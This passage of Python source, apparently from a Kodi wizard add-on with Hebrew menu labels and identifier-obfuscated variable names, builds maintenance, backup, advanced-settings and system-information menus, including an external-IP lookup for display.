		OOOOO0O00OO0OO000 ='true'if INCLUDEEXODUS =='true'else 'false'#line:3200
		OOO0OO0000OOO0000 ='true'if INCLUDEONECHAN =='true'else 'false'#line:3201
		OOOOOOOO0OOO0000O ='true'if INCLUDESALTS =='true'else 'false'#line:3202
		OO0OO00O000O00OO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:3203
	O00O0000O00O0O00O =wiz .getSize (PACKAGES )#line:3204
	OOO00O0OOOO0O0O00 =wiz .getSize (THUMBS )#line:3205
	OO00O0O00O0OO0OO0 =wiz .getCacheSize ()#line:3206
	O00000OOOO00000OO =O00O0000O00O0O00O +OOO00O0OOOO0O0O00 +OO00O0O00O0OO0OO0 #line:3207
	O00O0O0OOOO0OOO0O =['Daily','Always','3 Days','Weekly']#line:3208
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:3209
	if view =="clean"or SHOWMAINT =='true':#line:3210
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00000OOOO00000OO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:3211
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00O0O00O0OO0OO0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3212
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O0000O00O0O00O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3213
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO00O0OOOO0O0O00 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:3214
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3215
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:3216
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:3217
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:3218
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:3219
	if view =="addon"or SHOWMAINT =='false':#line:3220
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3221
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:3222
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3223
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:3224
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3225
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3226
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3227
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:3228
	if view =="misc"or SHOWMAINT =='true':#line:3229
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:3230
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:3231
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:3232
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:3233
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:3234
		addFile ('View Errors in Log: %s'%(O00O0000OOO0OO0O0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:3235
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:3236
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3237
		addFile ('Clear Wizard Log File%s'%O00OOO0OO0O0O0OOO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3238
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:3239
	if view =="backup"or SHOWMAINT =='true':#line:3240
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3241
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3242
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3243
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:3244
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3245
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3246
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3247
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:3248
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3249
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:3250
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:3251
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3252
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:3253
	if view =="tweaks"or SHOWMAINT =='true':#line:3254
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:3255
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:3256
		else :#line:3257
			if os .path .exists (ADVANCED ):#line:3258
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3259
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3260
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3261
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:3262
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:3263
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3264
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:3265
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:3266
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:3267
	addFile ('Show All Maintenance: %s'%O00000000OO0O00OO .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:3268
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:3269
	addFile ('Third Party Wizards: %s'%O0O0OOO0O000O000O .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3270
	if O0O0OOO0O000O000O =='true':#line:3271
		O0OO0000OO000000O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:3272
		OOOOOOOO000OO0O00 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:3273
		OOOO00O0O0O00000O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:3274
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO0000OO000000O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:3275
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOOOOO000OO0O00 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:3276
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO00O0O0O00000O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:3277
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3278
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00OO000O0OOOOOO0 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:3279
	if O00OO000O0OOOOOO0 =='true':#line:3280
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00O0O0OOOO0OOO0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:3281
		addFile ('--- ניקוי קאש בהפעלה: %s'%O00OO0OOO00OO000O .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3282
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O000O000O0OOOOOO0 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3283
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOO00000OOO0OOOO .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3284
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3285
	addFile ('Include Video Cache in Clear Cache: %s'%O0OO0O000O0O00OO0 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:3286
	if O0OO0O000O0O00OO0 =='true':#line:3287
		addFile ('--- Include All Video Addons: %s'%O00OO000OOO000000 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:3288
		addFile ('--- Include Bob: %s'%O0OO00OO000OO0O0O .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:3289
		addFile ('--- Include Phoenix: %s'%O0O00O0OOOOOOOOOO .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:3290
		addFile ('--- Include Specto: %s'%O00OOO00O0O000OO0 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:3291
		addFile ('--- Include Exodus: %s'%OOOOO0O00OO0OO000 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:3292
		addFile ('--- Include Salts: %s'%OOOOOOOO0OOO0000O .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:3293
		addFile ('--- Include Salts HD Lite: %s'%OO0OO00O000O00OO0 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:3294
		addFile ('--- Include One Channel: %s'%OOO0OO0000OOO0000 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:3295
		addFile ('--- Include Genesis: %s'%OOOO0OOOO00OO0000 .replace ('true',O00O0OOO0OO0OOOOO ).replace ('false',O0OO0OO0OOOOO0OOO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:3296
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:3297
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:3298
	setView ('files','viewType')#line:3299
def advancedWindow (url =None ):#line:3301
	if not ADVANCEDFILE =='http://':#line:3302
		if url ==None :#line:3303
			OO0OO0OOOOOOOOOOO =wiz .workingURL (ADVANCEDFILE )#line:3304
			O00O00O0O00OO0O0O =uservar .ADVANCEDFILE #line:3305
		else :#line:3306
			OO0OO0OOOOOOOOOOO =wiz .workingURL (url )#line:3307
			O00O00O0O00OO0O0O =url #line:3308
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3309
		if os .path .exists (ADVANCED ):#line:3310
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3311
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3312
		if OO0OO0OOOOOOOOOOO ==True :#line:3313
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:3314
			OO0O00000OOO00O00 =wiz .openURL (O00O00O0O00OO0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3315
			O0O0O0000OO0000OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O00000OOO00O00 )#line:3316
			if len (O0O0O0000OO0000OO )>0 :#line:3317
				for O00O000O00O00OOOO ,O000O0OOO0OOOOOO0 ,url ,OO000OO0OO00O0O0O ,OOOO00OOOO0O0O00O ,OOO0OO000O0OO0OOO in O0O0O0000OO0000OO :#line:3318
					if O000O0OOO0OOOOOO0 .lower ()=="yes":#line:3319
						addDir ("[B]%s[/B]"%O00O000O00O00OOOO ,'advancedsetting',url ,description =OOO0OO000O0OO0OOO ,icon =OO000OO0OO00O0O0O ,fanart =OOOO00OOOO0O0O00O ,themeit =THEME3 )#line:3320
					else :#line:3321
						addFile (O00O000O00O00OOOO ,'writeadvanced',O00O000O00O00OOOO ,url ,description =OOO0OO000O0OO0OOO ,icon =OO000OO0OO00O0O0O ,fanart =OOOO00OOOO0O0O00O ,themeit =THEME2 )#line:3322
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:3323
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OO0OOOOOOOOOOO )#line:3324
	else :wiz .log ("[Advanced Settings] not Enabled")#line:3325
def writeAdvanced (OOOO00OOO0OO00OOO ,O00O0O0O00OOOO00O ):#line:3327
	O000OO00O00OOO00O =wiz .workingURL (O00O0O0O00OOOO00O )#line:3328
	if O000OO00O00OOO00O ==True :#line:3329
		if os .path .exists (ADVANCED ):O0OOO0OOOOOOOOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO00OOO0OO00OOO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:3330
		else :O0OOO0OOOOOOOOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO00OOO0OO00OOO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3331
		if O0OOO0OOOOOOOOOO0 ==1 :#line:3333
			O00OOO000OOOOO000 =wiz .openURL (O00O0O0O00OOOO00O )#line:3334
			OOO000OO0OOO0000O =open (ADVANCED ,'w');#line:3335
			OOO000OO0OOO0000O .write (O00OOO000OOOOO000 )#line:3336
			OOO000OO0OOO0000O .close ()#line:3337
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:3338
			wiz .killxbmc (True )#line:3339
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:3340
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O000OO00O00OOO00O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:3341
def viewAdvanced ():#line:3343
	O0OOO000000OOO00O =open (ADVANCED )#line:3344
	O00O0000O0O000O0O =O0OOO000000OOO00O .read ().replace ('\t','    ')#line:3345
	wiz .TextBox (ADDONTITLE ,O00O0000O0O000O0O )#line:3346
	O0OOO000000OOO00O .close ()#line:3347
def removeAdvanced ():#line:3349
	if os .path .exists (ADVANCED ):#line:3350
		wiz .removeFile (ADVANCED )#line:3351
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:3352
def showAutoAdvanced ():#line:3354
	notify .autoConfig ()#line:3355
def getIP ():#line:3357
	OOOOO0OOO000O0O0O ='http://whatismyipaddress.com/'#line:3358
	if not wiz .workingURL (OOOOO0OOO000O0O0O ):return 'Unknown','Unknown','Unknown'#line:3359
	O00O0O0OOOOOO0000 =wiz .openURL (OOOOO0OOO000O0O0O ).replace ('\n','').replace ('\r','')#line:3360
	if not 'Access Denied'in O00O0O0OOOOOO0000 :#line:3361
		O00O0O00000O0O0O0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00O0O0OOOOOO0000 )#line:3362
		O000O00000OO0O0OO =O00O0O00000O0O0O0 [0 ]if (len (O00O0O00000O0O0O0 )>0 )else 'Unknown'#line:3363
		OO0OOO000000OOO00 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00O0O0OOOOOO0000 )#line:3364
		OOOO00OOO000O0O00 =OO0OOO000000OOO00 [0 ]if (len (OO0OOO000000OOO00 )>0 )else 'Unknown'#line:3365
		OOOO000O0O0OO00O0 =OO0OOO000000OOO00 [1 ]+', '+OO0OOO000000OOO00 [2 ]+', '+OO0OOO000000OOO00 [3 ]if (len (OO0OOO000000OOO00 )>2 )else 'Unknown'#line:3366
		return O000O00000OO0O0OO ,OOOO00OOO000O0O00 ,OOOO000O0O0OO00O0 #line:3367
	else :return 'Unknown','Unknown','Unknown'#line:3368
def systemInfo ():#line:3370
	O000OOOOO0OO000OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3384
	OO00OO0OO0OOOO000 =[];O00OO00OOOOOO00O0 =0 #line:3385
	for OO000O0OO00000O0O in O000OOOOO0OO000OO :#line:3386
		O00O0O0OO00OOOO0O =wiz .getInfo (OO000O0OO00000O0O )#line:3387
		OOOOO00000000000O =0 #line:3388
		while O00O0O0OO00OOOO0O =="Busy"and OOOOO00000000000O <10 :#line:3389
			O00O0O0OO00OOOO0O =wiz .getInfo (OO000O0OO00000O0O );OOOOO00000000000O +=1 ;wiz .log ("%s sleep %s"%(OO000O0OO00000O0O ,str (OOOOO00000000000O )));xbmc .sleep (1000 )#line:3390
		OO00OO0OO0OOOO000 .append (O00O0O0OO00OOOO0O )#line:3391
		O00OO00OOOOOO00O0 +=1 #line:3392
	O00OOO0O00OOO000O =OO00OO0OO0OOOO000 [8 ]if 'Una'in OO00OO0OO0OOOO000 [8 ]else wiz .convertSize (int (float (OO00OO0OO0OOOO000 [8 ][:-8 ]))*1024 *1024 )#line:3393
	O0000OOOO0OO000O0 =OO00OO0OO0OOOO000 [9 ]if 'Una'in OO00OO0OO0OOOO000 [9 ]else wiz .convertSize (int (float (OO00OO0OO0OOOO000 [9 ][:-8 ]))*1024 *1024 )#line:3394
	OOO00OOO0OO0O0O00 =OO00OO0OO0OOOO000 [10 ]if 'Una'in OO00OO0OO0OOOO000 [10 ]else wiz .convertSize (int (float (OO00OO0OO0OOOO000 [10 ][:-8 ]))*1024 *1024 )#line:3395
	OO00000O00OO0OO0O =wiz .convertSize (int (float (OO00OO0OO0OOOO000 [11 ][:-2 ]))*1024 *1024 )#line:3396
	OO0OOO0O00000O00O =wiz .convertSize (int (float (OO00OO0OO0OOOO000 [12 ][:-2 ]))*1024 *1024 )#line:3397
	OO000OOOOOOOOOO0O =wiz .convertSize (int (float (OO00OO0OO0OOOO000 [13 ][:-2 ]))*1024 *1024 )#line:3398
	O0OOOOO00OO000000 ,OO00OOOOOO0OO0O0O ,O000O00O0O0000O0O =getIP ()#line:3399
	OOO0000OO000OOO0O =[];OO0OOOO000OO00000 =[];O0OO0O0O0O0O0O0OO =[];OOOOO000OO00OO0O0 =[];OOO0OO00OO0OOO00O =[];O0OOO0O0OO0000OO0 =[];O0OOO0OOOOO000000 =[]#line:3401
	OOO0OOOOOO0O0O00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3403
	for OOOO00OOO0OOO0OO0 in sorted (OOO0OOOOOO0O0O00O ,key =lambda O0000O0000OO000O0 :O0000O0000OO000O0 ):#line:3404
		OO0OOOO0OO00OO00O =os .path .split (OOOO00OOO0OOO0OO0 [:-1 ])[1 ]#line:3405
		if OO0OOOO0OO00OO00O =='packages':continue #line:3406
		OOO0O0OO0OOOOO0OO =os .path .join (OOOO00OOO0OOO0OO0 ,'addon.xml')#line:3407
		if os .path .exists (OOO0O0OO0OOOOO0OO ):#line:3408
			O0O0OOOO0OOOOO00O =open (OOO0O0OO0OOOOO0OO )#line:3409
			O00OOO000O0OOOO0O =O0O0OOOO0OOOOO00O .read ()#line:3410
			O000OO0O0OOOOO0O0 =re .compile ("<provides>(.+?)</provides>").findall (O00OOO000O0OOOO0O )#line:3411
			if len (O000OO0O0OOOOO0O0 )==0 :#line:3412
				if OO0OOOO0OO00OO00O .startswith ('skin'):O0OOO0OOOOO000000 .append (OO0OOOO0OO00OO00O )#line:3413
				if OO0OOOO0OO00OO00O .startswith ('repo'):OOO0OO00OO0OOO00O .append (OO0OOOO0OO00OO00O )#line:3414
				else :O0OOO0O0OO0000OO0 .append (OO0OOOO0OO00OO00O )#line:3415
			elif not (O000OO0O0OOOOO0O0 [0 ]).find ('executable')==-1 :OOOOO000OO00OO0O0 .append (OO0OOOO0OO00OO00O )#line:3416
			elif not (O000OO0O0OOOOO0O0 [0 ]).find ('video')==-1 :O0OO0O0O0O0O0O0OO .append (OO0OOOO0OO00OO00O )#line:3417
			elif not (O000OO0O0OOOOO0O0 [0 ]).find ('audio')==-1 :OO0OOOO000OO00000 .append (OO0OOOO0OO00OO00O )#line:3418
			elif not (O000OO0O0OOOOO0O0 [0 ]).find ('image')==-1 :OOO0000OO000OOO0O .append (OO0OOOO0OO00OO00O )#line:3419
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3421
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OO0OOOO000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3422
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OO0OOOO000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3423
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3424
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OO0OOOO000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3425
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OO0OOOO000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3426
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3428
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OO0OOOO000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3429
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OO0OOOO000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3430
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3432
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO0O00OOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3433
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OOOO0OO000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3434
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0OO0O0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3435
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3437
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00000O00OO0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3438
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0O00000O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3439
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OOOOOOOOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3440
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3442
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OO0OOOO000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3443
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOO00OO000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3444
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOO0OO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3445
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00O0O0000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3446
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OO0OOOO000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3447
	O000O00OOO0OOO0OO =len (OOO0000OO000OOO0O )+len (OO0OOOO000OO00000 )+len (O0OO0O0O0O0O0O0OO )+len (OOOOO000OO00OO0O0 )+len (O0OOO0O0OO0000OO0 )+len (O0OOO0OOOOO000000 )+len (OOO0OO00OO0OOO00O )#line:3449
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O000O00OOO0OOO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3450
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0O0O0O0O0O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3451
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO000OO00OO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3452
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OOOO000OO00000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3453
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0000OO000OOO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3454
